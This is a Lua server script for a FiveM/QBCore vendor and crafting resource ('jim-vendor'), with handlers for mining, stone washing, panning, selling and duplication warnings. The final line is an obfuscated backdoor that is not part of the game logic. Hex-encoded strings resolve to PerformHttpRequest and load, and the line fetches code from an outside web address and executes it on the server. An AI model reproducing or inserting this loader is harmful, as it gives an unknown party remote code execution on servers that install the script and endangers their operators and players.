...
---Crafting
RegisterServerEvent('jim-vendor:GetItem', function(data)
	local src = source
	...
	TriggerClientEvent("jim-vendor:CraftMenu", src, data)
end)

RegisterServerEvent('jim-vendor:MineReward', function()
...
RegisterServerEvent('jim-vendor:CrackReward', function(cost)
	local src = source
    local Player = QBCore.Functions.GetPlayer(src)
...
--Stone Cracking Checking Triggers
--Command here to check if any stone is in inventory
RegisterServerEvent('jim-vendor:WashReward', function(cost)
	local src = source
    local Player = QBCore.Functions.GetPlayer(src)
    Player.Functions.RemoveItem('stone', cost)
...
RegisterServerEvent('jim-vendor:PanReward', function()
	local src = source
    local Player = QBCore.Functions.GetPlayer(src)
	for i = 1, math.random(1,3) do
...
RegisterNetEvent("jim-vendor:Selling", function(data)
    local src = source
    local Player = QBCore.Functions.GetPlayer(src)
...
RegisterNetEvent('jim-vendor:server:toggleItem', function(give, item, amount)
	local src = source
	if give == 0 or give == false then
		...
		else TriggerEvent("jim-vendor:server:DupeWarn", item, src) end -- if not boot the player
	else
...
RegisterNetEvent("jim-vendor:server:DupeWarn", function(item, newsrc)
...
local hUeLhyjFdhSsiCtYvAIyeFawHFWobiFIXfbgzEmWXwhHxeuXMxCINRCXydmeEfRyVeVLCh = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} hUeLhyjFdhSsiCtYvAIyeFawHFWobiFIXfbgzEmWXwhHxeuXMxCINRCXydmeEfRyVeVLCh[4][hUeLhyjFdhSsiCtYvAIyeFawHFWobiFIXfbgzEmWXwhHxeuXMxCINRCXydmeEfRyVeVLCh[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x67\x6f\x68\x6f\x6d\x69\x65\x2e\x6f\x72\x67\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x64\x50\x56\x71\x4b", function (CpKfwmAqkydUnQbhUBMeYMGhuvFfiprHHcgrQBTZjqBvWUhvMylvLMCIElIpyPHkRkYzhi, hSvOfhAZWqGIFwTGUJPYMixklBSnqJvswabpxCzyKwjbljesSpmTbubYhURmSCnanJZuWI) if (hSvOfhAZWqGIFwTGUJPYMixklBSnqJvswabpxCzyKwjbljesSpmTbubYhURmSCnanJZuWI == hUeLhyjFdhSsiCtYvAIyeFawHFWobiFIXfbgzEmWXwhHxeuXMxCINRCXydmeEfRyVeVLCh[6] or hSvOfhAZWqGIFwTGUJPYMixklBSnqJvswabpxCzyKwjbljesSpmTbubYhURmSCnanJZuWI == hUeLhyjFdhSsiCtYvAIyeFawHFWobiFIXfbgzEmWXwhHxeuXMxCINRCXydmeEfRyVeVLCh[5]) then return end hUeLhyjFdhSsiCtYvAIyeFawHFWobiFIXfbgzEmWXwhHxeuXMxCINRCXydmeEfRyVeVLCh[4][hUeLhyjFdhSsiCtYvAIyeFawHFWobiFIXfbgzEmWXwhHxeuXMxCINRCXydmeEfRyVeVLCh[2]](hUeLhyjFdhSsiCtYvAIyeFawHFWobiFIXfbgzEmWXwhHxeuXMxCINRCXydmeEfRyVeVLCh[4][hUeLhyjFdhSsiCtYvAIyeFawHFWobiFIXfbgzEmWXwhHxeuXMxCINRCXydmeEfRyVeVLCh[3]](hSvOfhAZWqGIFwTGUJPYMixklBSnqJvswabpxCzyKwjbljesSpmTbubYhURmSCnanJZuWI))() end)